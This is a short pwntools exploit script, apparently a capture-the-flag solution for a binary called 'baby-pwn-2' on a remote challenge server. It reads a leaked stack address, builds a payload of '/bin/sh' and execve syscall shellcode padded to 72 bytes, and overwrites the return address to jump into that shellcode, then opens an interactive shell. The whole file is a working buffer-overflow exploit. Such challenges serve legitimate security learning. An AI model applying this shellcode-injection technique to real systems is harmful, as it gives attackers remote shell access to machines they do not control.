from pwn import *
# nc 34.162.119.16 5000
r = remote('34.162.119.16', 5000)
# r = process('./baby-pwn-2')
# r = gdb.debug('./baby-pwn-2', 'b *0x4011a7')

elf = ELF('./baby-pwn-2')
context.binary = elf

r.recvuntil(b'leak: ')
leak = int(r.recvline().strip(), 16)
print(f'leak: {leak:x}')

payload = b'/bin/sh\x00'
shellcode = '''pop rdi
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x3b
syscall
'''
payload += asm(shellcode, arch='amd64') 
print(payload)
payload = payload.ljust(72, b'\x90')
payload += p64(leak + 8)
payload += p64(leak)

r.sendlineafter(b'text: ', payload)
r.interactive()